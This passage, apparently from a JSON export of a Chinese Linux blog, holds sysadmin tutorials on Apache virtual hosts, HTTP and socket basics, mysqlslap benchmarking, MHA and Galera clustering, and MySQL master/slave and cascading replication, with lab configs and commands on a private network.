192.168.1.22:80\u0026gt; DocumentRoot \u0026quot;/data/web2\u0026quot; ServerName www.test2.com ErrorLog \u0026quot;logs/test2.com.error_log\u0026quot; TransferLog \u0026quot;logs/test2.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost 192.168.1.33:80\u0026gt; DocumentRoot \u0026quot;/data/web3\u0026quot; ServerName www.test3.com ErrorLog \u0026quot;logs/test3.com.error_log\u0026quot; TransferLog \u0026quot;logs/test3.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; ​\t在另外一台主机上，验证实验结果\n$curl 192.168.1.11 www.test1.com $curl 192.168.1.22 www.test2.com $curl 192.168.1.33 www.test3.com 实验三：FQDN ​\t配置文件的更改，这里主要是的更改ServerName\n$ vim /etc/httpd/conf.d/test.conf \u0026lt;directory /data/\u0026gt; require all granted \u0026lt;/directory\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026quot;/data/web1\u0026quot; ServerName www.test1.com ErrorLog \u0026quot;logs/test1.com.error_log\u0026quot; TransferLog \u0026quot;logs/test1.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026quot;/data/web2\u0026quot; ServerName www.test2.com ErrorLog \u0026quot;logs/test2.com.error_log\u0026quot; TransferLog \u0026quot;logs/test2.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026quot;/data/web3\u0026quot; ServerName www.test3.com ErrorLog \u0026quot;logs/test3.com.error_log\u0026quot; TransferLog \u0026quot;logs/test3.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; ​\t在另外一台主机进行验证结果,不过基于主机的配置，需要DNS解析；这里为了方便，直接在hosts文件做名词解析；直接curl 192.168.1.8，这里/var/www/html已经失效，会默认访问基于虚拟主机的第一个网站\n$vim /etc/hosts 192.168.1.8 www.test1.com www.test2.com www.test3.com $curl www.test1.com www.test1.com $curl www.test2.com www.test2.com $curl www.test3.com www.test3.com $curl 192.168.1.8 www.test1.com ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-19-http_apache1/","tags":["Linux"],"title":"Http(Apache1)"},{"categories":["Http"],"contents":"摘要：internet的发展，套接字socket的简介，HTTP协议，URL\u0026mdash;\u0026mdash;-\nInternet And China  1969年   Internet最早来源于美国国防部高级研究计划局ARPA建立的ARPANet，1969年投入运行。1983年，ARPAnet分裂为两部分：ARPAnet和纯军事用的MILNET。当年1月，ARPA把TCP/IP协议作为ARPAnet的标准协议，这个以ARPAnet为主干网的网际互联网便被称为Internet。1986年，美国国家科学基金会建立计算机通信网络NSFnet。此后，NSFNet逐渐取代ARPANet在Internet的地位。1990年，ARPANet正式关闭. 北京时间1987年9月20日，钱天白建立起一个网络节点，通过电话拨号连接到国际互联网，向他的德国朋友发出来自中国的第一封电子邮件：Across theGreat Wall we can reach every corner in the world，自此，中国与国际计算机网络开始连接在一起.\n  1990年10月   钱天白教授代表中国正式在国际互联网络信息中心的前身DDN-NIC注册登记了我国的顶级域名CN，并且从此开通了使用中国顶级域名CN的国际电子邮件服务。由于当时中国尚未正式连入Internet，所以委托德国卡尔斯鲁厄大学运行CN域名服务器\n  1993年3月2日   中国科学院高能物理研究所租用AT\u0026amp;T公司的国际卫星信道接入美国斯坦福线性加速器中心（SLAC）的64K专线正式开通,专线开通后，美国政府以Internet上有许多科技信息和其它各种资源，不能让社会主义国家接入为由，只允许这条专线进入美国能源网而不能连接到其它地方。尽管如此，这条专线仍是我国部分连入Internet的第一根专线\n  1994年4月20日   中国实现与互联网的全功能连接，被国际上正式承认为有互联网的国家.\n  1994年5月21日   在钱天白教授和德国卡尔斯鲁厄大学的协助下，中国科学院计算机网络信息中心完成了中国国家顶级域名(CN)服务器的设置，改变了中国的CN顶级域名服务器一直放在国外的历史.\n  1996年1月   中国互联网全国骨干网建成并正式开通，开始提供服务.\n Socket概念 TCP/IP协议\n跨网络主机通讯  在建立通信连接的每一端，进程间的传输要有两个标志： IP地址和端口号，合称为套接字地址 socket address 客户机套接字地址定义了一个唯一的客户进程 服务器套接字地址定义了一个唯一的服务器进程  socket套接字  Socket:套接字，进程间通信IPC的一种实现，允许位于不同主机（或同一主机）上  不同进程之间进行通信和数据交换，SocketAPI出现于1983年，4.2 BSD实现\n Socket API：封装了内核中所提供的socket通信相关的系统调用 Socket Domain：根据其所使用的地址  AF_INET：Address Family，IPv4 AF_INET6：IPv6 AF_UNIX：同一主机上不同进程之间通信时使用  Socket Type：根据使用的传输层协议  SOCK_STREAM：流，tcp套接字，可靠地传递、面向连接 SOCK_DGRAM：数据报，udp套接字，不可靠地传递、无连接 SOCK_RAW: 裸套接字,无须tcp或tdp,APP直接通过IP包通信 C/S程序套接字函数 套接字相关的系统调用：\nsocket(): 创建一个套接字 bind()：绑定IP和端口 listen()：监听 accept()：接收请求 connect()：请求连接建立 write()：发送 read()：接收 close():关闭连接 Socket通信示例： 服务器端:tcpserver.py\n#!/usr/bin/env python import socket HOST=\u0026#39;127.0.0.1\u0026#39; PORT=9527 BUFFER=4096 sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.bind((HOST,PORT)) sock.listen(3) print(\u0026#39;tcpServer listen at: %s:%s\\n\\r\u0026#39; %(HOST,PORT)) while True: client_sock,client_addr=sock.accept() print(\u0026#39;%s:%sconnect\u0026#39; %client_addr) while True: recv=client_sock.recv(BUFFER) if not recv: client_sock.close() break print(\u0026#39;[Client %s:%ssaid]:%s\u0026#39; %(client_addr[0],client_addr[1],recv)) client_sock.send(\u0026#39;tcpServer has received your message\u0026#39;) sock.close() **客户端：**tcpclient.py\n#!/usr/bin/env python import socket HOST=\u0026#39;127.0.0.1\u0026#39; PORT=9527 BUFFER=4096 sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.connect((HOST,PORT)) sock.send(\u0026#39;hello, tcpServer!\u0026#39;) recv=sock.recv(BUFFER) print(\u0026#39;[tcpServer said]: %s\u0026#39; % recv) sock.close() 以普通用户运行python tcpserver.py时,对port的要求比较严格.\n0-1023：系统端口或特权端口(仅管理员可用) ，众所周知，永久的分配给固定的系统应用使用，22/tcp(ssh), 80/tcp(http), 443/tcp(https) HTTP通讯及术语   http: Hyper Text Transfer Protocol, 80/tcp\n  html: Hyper Text Markup Language 超文本标记语言，编程语言\n  示例：\n  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;html语言 \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026quot;https://y.gtimg.cn/music/photo_new/T002R300x300M000001iSiol1uL9K3.jpg?max_age=2592000\u0026quot; \u0026gt; \u0026lt;h1\u0026gt;标题1\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=http://www.baidu.com\u0026gt;百度一下\u0026lt;/a\u0026gt;欢迎\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  CSS: Cascading Style Sheet 层叠样式表。类似tempaltes的模板文件 js: javascript  MIME： Multipurpose Internet Mail Extensions\n  多用途互联网邮件扩展 /etc/mime.types\n  格式：major/minor\n  text/plain text/html text/css image/jpeg image/png video/mp4 application/javascript 参考\nHTTP协议介绍  http/0.9：1991    原型版本，功能简陋，只有一个命令GET。GET /index.html ,服务器只能回应HTML格式字符串，不能回应别的格式.    http/1.0: 1996年5月,支持cache, MIME, method    每个TCP连接只能发送一个请求，发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接; 引入了POST命令和HEAD命令; 头信息是 ASCII 码，后面数据可为任何格式。服务器回应时会告诉客户端，数据是什么格式，Content-Type字段的作用。这些数据类型总称为MIME 多用途互联网邮件扩展，每个值包括一级类型和二级类型，预定义的类型，也可自定义类型, 常见Content-Type值：text/xml image/jpeg audio/mp3.    http/1.1：1997年1月    引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection: keep-alive。对于同一个域名，大多数浏览器允许同时建立6个持久连接 引入了管道机制（pipelining），即在同一个TCP连接里，客户端可以同时发送多个请求，进一步改进了HTTP协议的效率 新增方法：PUT、PATCH、OPTIONS、DELETE 同一个TCP连接里，所有的数据通信是按次序进行的。服务器只能顺序处理回应，前面的回应慢，会有许多请求排队，造成\u0026quot;队头堵塞\u0026rdquo;（Head-of-line blocking） 为避免上述问题，两种方法：一是减少请求数，二是同时多开持久连接。网页优化技巧，如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等 HTTP 协议不带有状态，每次请求都必须附上所有信息。请求的很多字段都是重复的，浪费带宽，影响速度    Spdy：2009年,谷歌研发,解决 HTTP/1.1 效率不高问题 http/2.0：2015年    头信息和数据体都是二进制，称为头信息帧和数据帧 复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，且不用按顺序一一对应，避免了“队头堵塞“,此双向的实时通信称为多工（Multiplexing） 引入头信息压缩机制（header compression）,头信息使用gzip或compress压缩后再发送；客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，不发送同样字段，只发送索引号，提高速度 HTTP/2 允许服务器未经请求，主动向客户端发送资源，即服务器推送（server push）   URI  URI: Uniform Resource Identifier 统一资源标识，分为URL和URN     URN: Uniform Resource Naming，统一资源命名\n示例： P2P下载使用的磁力链接是URN的一种实现 magnet:?xt=urn:btih:660557A6890EF888666\n  URL: Uniform Resorce Locator，统一资源定位符，用于描述某服务器某特定资源位置\n  两者区别：URN如同一个人的名称，而URL代表一个人的住址。换言之，URN定义某事物的身份，而URL提供查找该事物的方法。URN仅用于命名，而不指定地址\n   URL的组成\n\u0026lt;scheme\u0026gt;://\u0026lt;user\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;path\u0026gt;;\u0026lt;params\u0026gt;?\u0026lt;query\u0026gt;#\u0026lt;frag\u0026gt; schame:方案，访问服务器以获取资源时要使用哪种协议 user:用户，某些方案访问资源时需要的用户名 password:密码，用户对应的密码，中间用：分隔 Host:主机，资源宿主服务器的主机名或IP地址 port:端口,资源宿主服务器正在监听的端口号，很多方案有默认端口号 path:路径,服务器资源的本地名，由一个/将其与前面的URL组件分隔 params:参数，指定输入的参数，参数为名/值对，多个参数，用;分隔 query:查询，传递参数给程序，如数据库，用？分隔,多个查询用\u0026amp;分隔 frag:片段,一小片或一部分资源的名字，此组件在客户端使用，用#分隔 ###示例如下： https://list.jd.com/list.html?cat=670,671,672\u0026amp;ev=149_2992\u0026amp;sort=sort_totalsales15_desc\u0026amp;trans=1 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-19-http_apache0/","tags":["Linux"],"title":"Http(Apache)"},{"categories":["mysql"],"contents":"摘要：mysql的压力测试,主要介绍Mysqlslap；生产配置文件示例\nMysqlslap ​ Mysqlslap：来自于mariadb包，测试的过程默认生成一个mysqlslap的schema,生成测试表t1，查询和插入测试数据，mysqlslap库自动生成，如果已经存在则先删除。用--only-print来打印实际的测试过程，整个测试完成后不会在数据库中留下痕迹\n 使用格式：mysqlslap [options] 常用参数 [options] 说明： --auto-generate-sql, -a 自动生成测试表和数据，表示用mysqlslap工具自己生成的SQL脚本来测试并发压力 --auto-generate-sql-load-type=type 测试语句的类型。代表要测试的环境是读操作还是写操作还是两者混合的。取值包括：read，key，write，update和mixed(默认) --auto-generate-sql-add-auto-increment 代表对生成的表自动添加auto_increment列，从5.1.18版本开始支持 --number-char-cols=N, -x N 自动生成的测试表中包含多少个字符类型的列，默认1 --number-int-cols=N, -y N 自动生成的测试表中包含多少个数字类型的列，默认1 --number-of-queries=N 总的测试查询次数(并发客户数×每客户查询次数) --query=name,-q 使用自定义脚本执行测试，例如可以调用自定义的存储过程或者sql语句来执行测试 --create-schema 代表自定义的测试库名称，测试的schema，MySQL中schema也就是database --commint=N 多少条DML后提交一次 --compress, -C 如服务器和客户端都支持压缩，则压缩信息 --concurrency=N, -c N 表示并发量，即模拟多少个客户端同时执行select。可指定多个值，以逗号或者\u0026ndash;delimiter参数指定值做为分隔符 如：--concurrency=100,200,500 --engine=engine_name, -e engine_name 代表要测试的引擎，可以有多个，用分隔符隔开。例如：--engines=myisam,innodb --iterations=N, -i N 测试执行的迭代次数，代表要在不同并发环境下，各自运行测试多少次 --only-print 只打印测试语句而不实际执行。 --detach=N 执行N条语句后断开重连 --debug-info, -T 打印内存和CPU的相关信息  单线程测试:mysqlslap -a -uroot -ppassword **多线程测试:**使用–concurrency来模拟并发连接\nmysqlslap -a -c 100 -uroot -ppassword **迭代测试:**用于需要多次执行测试得到平均值\nmysqlslap -a -i 10 -uroot -ppassword mysqlslap ---auto-generate-sql-add-autoincrement -a mysqlslap -a --auto-generate-sql-load-type=read mysqlslap -a --auto-generate-secondary-indexes=3 mysqlslap -a --auto-generate-sql-write-number=1000 mysqlslap --create-schema world -q \u0026quot;select count(*) from City” mysqlslap -a -e innodb -uroot -ppassword mysqlslap -a --number-of-queries=10 -uroot -ppassword 测试不同的存储引擎性能\nmysqlslap -a --concurrency=50,100 --number-of-queries 1000 --iterations=5 --engine=myisam,innodb --debug-info -uroot -ppassword 执行一次测试，分别50和100个并发，执行1000次总查询\nmysqlslap -a --concurrency=50,100 --number-of-queries 1000 --debug-info -uroot -ppassword 50和100个并发分别得到一次测试结果(Benchmark)，并发数越多，执行完所有查询的时间越长。为了准确起见，可以多迭代测试几次.\nmysqlslap -a --concurrency=50,100 --number-of-queries 1000 --iterations=5 --debug-info -uroot -ppassword 生产环境的示例  摘自于王晓春。\n  硬件：内存32G innodb_file_per_table = 1 打开独立表空间 max_connections = 8000 #MySQL 服务所允许的同时会话数的上限，经常出现Too Many Connections的错误提 示，则需要增大此值 back_log = 300 #back_log 是操作系统在监听队列中所能保持的连接数 max_connect_errors = 1000 #每个客户端连接最大的错误允许数量，当超过该次数，MYSQL服务器将禁止此主机的连 接请求，直到MYSQL服务器重启或通过flush hosts命令清空此主机的相关信息 open_files_limit = 10240 #所有线程所打开表的数量 max_allowed_packet = 32M #每个连接传输数据大小.最大1G，须是1024的倍数，一般设为最大的BLOB的值 wait_timeout = 10 #指定一个请求的最大连接时间 sort_buffer_size = 16M #排序缓冲被用来处理类似ORDER BY以及GROUP BY队列所引起的排序 join_buffer_size = 16M #不带索引的全表扫描.使用的buffer的最小值 query_cache_size = 128M #查询缓冲大小 query_cache_limit = 4M #指定单个查询能够使用的缓冲区大小，缺省为1M transaction_isolation = REPEATABLE-READ # 设定默认的事务隔离级别 thread_stack = 512K # 线程使用的堆大小. 此值限制内存中能处理的存储过程的递归深度和SQL语句复杂性， 此容量的内存在每次连接时被预留. log-bin # 二进制日志功能 log_long_format=row #二进制日志格式 innodb_buffer_pool_size = 6G #InnoDB使用一个缓冲池来保存索引和原始数据, 可设置这个变量到服务器物理内存大小 的80% innodb_file_io_threads = 4 #用来同步IO操作的IO线程的数量 innodb_thread_concurrency = 16 #在InnoDb核心内的允许线程数量，建议的设置是CPU数量加上磁盘数量的两倍 innodb_log_buffer_size = 16M # 用来缓冲日志数据的缓冲区的大小. innodb_log_file_size = 512M 在日志组中每个日志文件的大小. innodb_log_files_in_group = 3 # 在日志组中的文件总数 innodb_lock_wait_timeout = 120 # SQL语句在被回滚前,InnoDB事务等待InnoDB行锁的时间 long_query_time = 2 #慢查询时长 log-queries-not-using-indexes #将没有使用索引的查询也记录下来 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-15-mysql-10/","tags":["Cluster","mysql","slap"],"title":"MYSQL压力测试"},{"categories":["mysql"],"contents":"摘要：MySQL的高可用，Cluster，Galera Cluster的应用。\nMySQL的高可用 Master HA或多主模型 MMM: Multi Master MySQL，基于主从复制实现 MHA： Master High Availability，对主节点进行监控，可实现自动故障转移至其它从节点；通过提升某一从节点为新的主节点，基于主从复制实现，还需要客户端配合实现，目前MHA主要支持一主多从的架构，要搭建MHA,要求一个复制集群中必须最少有三台数据库服务器，一主二从，即一台充当master，一台充当备用master，另外一台充当从库，出于机器成本的考虑，淘宝进行了改造，目前淘宝TMHA已经支持一主一从,MHA是由Prel语言编写。 官网下载MHA Galera Cluster：wresp 通过wresp协议在全局实现复制；任何一节点都可读写，不需要主从复制，实现多主可读可写\nMHA工作原理  从宕机崩溃的master保存二进制日志事件（binlog events） 识别含有最新更新的slave 应用差异的中继日志（relay log）到其他的slave 应用从master保存的二进制日志事件（binlog events） 提升一个slave为新的master 使其他的slave连接新的master进行复制  MHA软件由两部分组成，Manager工具包和Node工具包\nManager工具包主要包括以下几个工具：\n  masterha_check_ssh  检查MHA的SSH配置状况\n  masterha_check_repl 检查MySQL复制状况\n  masterha_manger 启动MHA\n  masterha_check_status 检测当前MHA运行状态\n  masterha_master_monitor 检测master是否宕机\n  masterha_master_switch 故障转移（自动或手动）\n  masterha_conf_host 添加或删除配置的server信息\n  Node工具包：这些工具通常由MHA Manager的脚本触发，无需人为操作）主要包括以下几个工具：\n save_binary_logs 保存和复制master的二进制日志 apply_diff_relay_logs 识别差异的中继日志事件并将其差异的事件应用于其他的slave filter_mysqlbinlog 去除不必要的ROLLBACK事件（MHA已不再使用此工具） purge_relay_logs 清除中继日志（不会阻塞SQL线程） 注意：为了尽可能的减少主库硬件损坏宕机造成的数据丢失，因此在配置MHA的同时建议配置成MySQL 5.5的半同步复制  实现MHA的搭建 原理图如下：至少需要4台主机。\n准备工作   nptdate ：保证时间同步,在/etc/ntp.conf ,加上 server 172.20.0.1 ibrust，重启服务 systemctl restart ntpd\n  安装包：\nManager上安装mha4mysql-node-0.56-0.el6.noarch.rpm,mha4mysql-manager-0.56-0.el6.noarch.rpm，需要启用epel源下载安装依赖 其余节点：安装mha4mysql-node-0.56-0.el6.noarch.rpm\n  selinux，iptables需要关闭.\n  四台主机的IP配置模拟\n  Manager:192.168.1.6 master:192.168.1.7 slave1:129.168.1.8 slave2: 192.168.1.17 Manager主机 ​\t实现四台主机的基于key验证,$ip为上面四台主机的ip配置。\nssh-genkey ssh-copy-id 192.168.1.6 scp -rp .ssh $ip:/root/.ssh ​\t安装mha4mysql-node-0.56-0.el6.noarch.rpm,mha4mysql-manager-0.56-0.el6.noarch.rpm，需要启用epel源下载安装依赖文件。\n$ yum install -y mha4mysql-node-0.56-0.el6.noarch.rpm $ yum install -y mha4mysql-manager-0.56-0.el6.noarch.rpm ​\t在Manager配置MHA的配置文件/etc/mha/app1.cnf，server1中的candidate_master=1,是可能变成主服务器的键值对选项。\nvim /etc/mha/app1.cnf [server default] user=mhauser password=centos manager_workdir=/data/mha/app1/ manager_log= /data/mha/app1/manager.log remote_workdir= /data/mha/app1/ ssh_user=root repl_user=repluser repl_password=centos ping_interval=1 [server1] hostname=192.168.1.7 candidate_master=1 [server2] hostname=192.168.1.8 candidate_master=1 [server3] hostname=192.168.1.17 ​\t开启集群，注意：在开启集群之前，要保证master和slave1，和slave2全部配置成主从复制架构。\nmasterha_check_ssh --conf=/etc/mha/app1.cnf masterha_check_repl --conf=/etc/mha/app1.cnf #前台运行 masterha_manager --conf=/etc/mha/app1.cnf #排错日志/data/mastermha/app1/manager.log Master主机 $ yum install -y mha4mysql-node-0.56-0.el6.noarch.rpm $ vim /etc/my.cnf server_id=1 log_bin binlog_format=row skip_name_resolve $ systemctl restart mariadb grant replication slave on *.* to repluser@'192.168.1.%' identified by 'centos'; show master logs; grant all on *.* to mhauser@'192.168.1.%' identified by 'centos'; show grants for mhauser@'192.168.1.%' slave1 $ yum install -y mha4mysql-node-0.56-0.el6.noarch.rpm $ vim /etc/my.cnf log_bin server_id=2 read_only=1 relay_log_purge=0 skip_name_resolve=1 $ systemctl restart mariadb $ mysql CHANGE MASTER TO MASTER_HOST='192.168.1.7', MASTER_USER='repluser', MASTER_PASSWORD='centos', MASTER_PORT=3306, MASTER_LOG_FILE='master-bin.000001', MASTER_LOG_POS=245; start slave; slave2 $ yum install -y mha4mysql-node-0.56-0.el6.noarch.rpm $ vim /etc/my.cnf log_bin server_id=3 read_only=1 relay_log_purge=0 skip_name_resolve=1 $ systemctl restart mariadb $ mysql CHANGE MASTER TO MASTER_HOST='192.168.1.7', MASTER_USER='repluser', MASTER_PASSWORD='centos', MASTER_PORT=3306, MASTER_LOG_FILE='master-bin.000001', MASTER_LOG_POS=245; start slave; Galera Cluster Galera Cluster：集成了Galera插件的MySQL集群，是一种新型的，数据不共享的，高度冗余的高可用方案，目前Galera Cluster有两个版本，分别是Percona Xtradb Cluster及MariaDB Cluster，Galera本身是具有多主特性的，即采用multi-master的集群架构，是一个既稳健，又在数据一致性、完整性及高性能方面有出色表现的高可用解决方案。\n官方参考文档参考如下:\nhttp://galeracluster.com/documentation-webpages/galera-documentation.pdf\nhttp://galeracluster.com/documentation-webpages/index.html\nhttps://mariadb.com/kb/en/mariadb/getting-started-with-mariadb-galera-cluster/\nGalera Cluster 的实现 注意：安装基于Galera的mariadb-5.5.60，不能安装mariadb-server包 三个节点的配置原理 三个节点组成了一个集群，与普通的主从架构不同，它们都可以作为主节点，三个节点是对等的，称为multi-master架构，当有客户端要写入或者读取数据时，连接哪个实例都是一样的，读到的数据是相同的，写入某一个节点之后，集群自己会将新数据同步到其它节点上面，这种架构不共享任何数据，是一种高冗余架构。\n配置过程 下载安装MariaDB-Galera-server,国外yum源速度太慢，提供清华源下载。\nvim /etc/yum.repos.d/base.repo [mariadb] name = MariaDB baseurl = https://mirrors.tuna.tsinghua.edu.cn/mariadb/mariadb-5.5.60/yum/centos7-amd64/ gpgcheck=0 $ yum install -y MariaDB-Galera-server $ rpm -ql MariaDB-Galera-server $ rpm -qf /usr/lib64/galera/libgalera_smm.so 配置文件的修改 三台主机都需要修改，wsrep_provider，wsrep_cluster_address，binlog_format，主要改着三个键值对。\n$ vim /etc/my.cnf.d/server.cnf wsrep_provider = /usr/lib64/galera/libgalera_smm.so wsrep_cluster_address=\u0026quot;gcomm://192.168.1.7,192.168.1.8,192.168.1.17\u0026quot; binlog_format=row #default_storage_engine=InnoDB #innodb_autoinc_lock_mode=2 #bind-address=0.0.0.0 启动相关 首次启动需要添加--wsrep-new-cluster，其他节点正常启动\n/etc/init.d/mysql start --wsrep-new-cluster Starting MariaDB.180619 19:24:40 mysqld_safe Logging to '/var/log/mariadb/mariadb.log'. 180619 19:24:40 mysqld_safe Starting mysqld daemon with databases from /data/mysql ... SUCCESS! /etc/init.d/mysql start Starting MariaDB.180619 19:24:53 mysqld_safe Logging to '/var/log/mariadb/mariadb.log'. 180619 19:24:53 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql ...SST in progress, setting sleep higher.. SUCCESS! 测试及查询状态 数据会及时同步，如果三台服务器在相同数据表的相同行同时执行增删改，则只有一台节点会成功。\nSHOW STATUS LIKE '%wsrep%'\\G SHOW STATUS LIKE 'wsrep_cluster_size'; +--------------------+-------+ | Variable_name | Value | +--------------------+-------+ | wsrep_cluster_size | 3 |\t#cluster共有3台服务器 +--------------------+-------+ 1 row in set (0.00 sec) ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-15-mysql-09/","tags":["Cluster","mysql","MHA"],"title":"MYSQL高可用集群"},{"categories":["mysql"],"contents":"摘要：mysql的主从复制，级联复制，加密复制，半同步复制，cluster,\nMysql复制 扩展方式： Scale Up ，Scale Out\nMySQL的扩展\n 读写分离 复制：每个节点都有相同的数据集 向外扩展 二进制日志,实现主从的主要原理 单向\n 复制的功用：\n 数据分布 负载均衡读 备份 高可用和故障切换 MySQL升级测试\n 主从复制线程：  主节点：  dump Thread：为每个Slave的I/O Thread启动一个dump线程，用于向其发送binary log events\n 从节点：  I/O Thread：向Master请求二进制日志事件，并保存于中继日志中 SQL Thread：从中继日志中读取日志事件，在本地完成重放\n 跟复制功能相关的文件：  master.info：用于保存slave连接至master时的相关信息，例如账号、密码、服务器地址等。 relay-log.info：保存在当前slave节点上已经复制的当前二进制日志和本地replay log日志的对应关系\n 主从复制特点：   异步复制 主从数据不一致比较常见\n  复制架构：   Master/Slave, Master/Master, 环状复制 一主多从 从服务器还可以再有从服务器 一从多主:适用于多个不同数据库\n  复制需要考虑二进制日志事件记录格式  STATEMENT（5.0之前），ROW（5.1之后，推荐），MIXED\n搭建主从复制 主服务器 修改配置文件/etc/my.cnf，启动服务，并授权slave账户同步，同时，记录二进制日志的位置\n$ vim /etc/my.cnf [mysqld] server_id=1 log-bin log-basename=master innodb_file_per_table $ systemctl restart mariadb $ mysql -- 启动服务 grant replication slave on *.* to repluser@\u0026#39;192.168.1.%\u0026#39; identified by \u0026#39;centos\u0026#39;; show master status; -- master-bin.000003 399 source hellodb.sql CALL pro_testlog(); 从服务器 修改配置文件/etc/my.cnf,在[mysqld]添加server_id=2,必须和主服务器不一样。修改完配置文件，重启服务即可systemctl restart mariadb\nHELP CHANGE MASTER TO CHANGE MASTER TO MASTER_HOST=\u0026#39;192.168.1.8\u0026#39;, MASTER_USER=\u0026#39;repluser\u0026#39;, MASTER_PASSWORD=\u0026#39;centos\u0026#39;, MASTER_PORT=3306, MASTER_LOG_FILE=\u0026#39;master-bin.000003\u0026#39;, MASTER_LOG_POS=399; SHOW SLAVE STATUS\\G -- 启动同步，后续会自动启动 START SLAVE; SHOW SLAVE STATUS\\G -- Seconds_Behind_Master: 0 这个为0，说明同步完成 报错学习 做实验的时候，从服务器同步不了，还报错了。\nshow slave status\\G: Slave_IO_Running: yes Slave_SQL_Running: No Last_SQL_Error: Error 'Duplicate entry '%-test-' for key 'PRIMARY'' on query. Default database: 'mysql'. Query: 'INSERT INTO db SELECT * FROM tmp_db WHERE @had_db_table=0' Last_Error: Error 'Table 'testlog' already exists' on query. Default database: 'hellodb'. Query: 'create table testlog (id int auto_increment primary key,name char(10),age int default 20)' 报错从日志查询,查询了一下报错，1062的报错，应该是主键冲突。\ntail -f /var/log/mariadb/mariadb.log 180614 17:36:05 [ERROR] Slave SQL: Error 'Table 'testlog' already exists' on query. Default database: 'hellodb'. Query: 'create table testlog (id int auto_increment primary key,name char(10),age int default 20)', Error_code: 1050 180614 17:46:48 [Note] Slave I/O thread: connected to master 'repluser@192.168.1.8:3306',replication started in log 'FIRST' at position 4 180614 17:46:48 [ERROR] Slave SQL: Error 'Duplicate entry '%-test-' for key 'PRIMARY'' on query. Default database: 'mysql'. Query: 'INSERT INTO db SELECT * FROM tmp_db WHERE @had_db_table=0', Error_code: 1062 180614 17:46:48 [Warning] Slave: Duplicate entry '%-test-' for key 'PRIMARY' Error_code: 1062 ​\t然后查询了一下mariadb服务器的binlog_format,居然是select @@binlog_format;,STATEMENT ,心中忽然一喜，应该是这个问题，网上也查询了蛮多了资料，最后解决了这个报错如下： 在主服务器上,在/etc/my.cnf将binlog_format=row，重启服务\n-- 确认binlog_format为row select @@binlog_format; FLUSH TABLES WITH READ LOCK; SHOW MASTER STATUS; -- 记录位置 master-bin.000005 245 UNLOCK TABLES; ​\t在从服务器上,重新重置即可解决。\nSTOP SLAVE; reset slave all; CHANGE MASTER TO MASTER_HOST='192.168.1.8', MASTER_USER='repluser', MASTER_PASSWORD='centos', MASTER_PORT=3306, MASTER_LOG_FILE='master-bin.000005', MASTER_LOG_POS=245; START SLAVE; 主从复制plus： 场景：从服务器的大数据备份,随着业务的增加，要求增加从服务器\n主节点备份\n$ mysqldump -A -F --single-transaction --master-data=1 \u0026gt;full.sql #将全备份文件复制到新增的从服务器上。 $ scp full.sql 192.168.1.10:/backup 新增从节点的配置\n配置/etc/my.cnf加入下面几行即可。然后启动服务。\ntips：/etc/my.cnf,文件损坏，想恢复默认设置，yum install - y mariadb-libs\n$ vim /etc/my.cnf server_id=2 read_only relay_log=relay-log relay_log_index=relay-log.index $ systemctl start mariadb 将全备份的/backup/full.sql的change master to子句改为最初起点。然后实现sql语句全备份，并自动同步\n$ vim /backup/full.sql ··· CHANGE MASTER TO MASTER_HOST='192.168.1.7', MASTER_USER='repluser', MASTER_PASSWORD='centos', MASTER_PORT=3306, MASTER_LOG_FILE='master-bin.000001', MASTER_LOG_POS=245, ··· $ mysql \u0026lt; /backup/full.sql 配置完成 级联复制 master：192.168.1.7；slave1：192.168.1.8;slave2:192.168.1.18\n主节点配置 $ vim /etc/my.cnf [mysqld] server_id=1 log-bin log-basename=master innodb_file_per_table $ systemctl restart mariadb $ mysql -- 启动服务 grant replication slave on *.* to repluser@'192.168.1.%' identified by 'centos'; show master status; -- master-bin.000001 245 source hellodb.sql CALL pro_testlog(); slave1的配置 ip为192.168.1.8，配置过程和主从复制差不多。\n$ vim /etc/my.cnf server_id=2 log_bin log_slave_updates read_only $ systemctl restart mariadb $ mysql CHANGE MASTER TO MASTER_HOST='192.168.1.7', MASTER_USER='repluser', MASTER_PASSWORD='centos', MASTER_PORT=3306, MASTER_LOG_FILE='master-bin.000001', MASTER_LOG_POS=245, start slave; stop slave; -- 重置slave的日志，但是不破坏数据库 reset slave all; salve2的配置 ip为192.168.1.18,此时，slave2的主是slave1，故而master的ip应该为192.168.1.8\nHELP CHANGE MASTER TO CHANGE MASTER TO MASTER_HOST='192.168.1.8', MASTER_USER='repluser', MASTER_PASSWORD='centos', MASTER_PORT=3306, MASTER_LOG_FILE='master-bin.000001', MASTER_LOG_POS=245; SHOW SLAVE STATUS\\G -- 启动同步，后续会自动启动 START SLAVE; SHOW SLAVE STATUS\\G -- Seconds_Behind_Master: 0 这个为0，说明同步完成 半同步复制 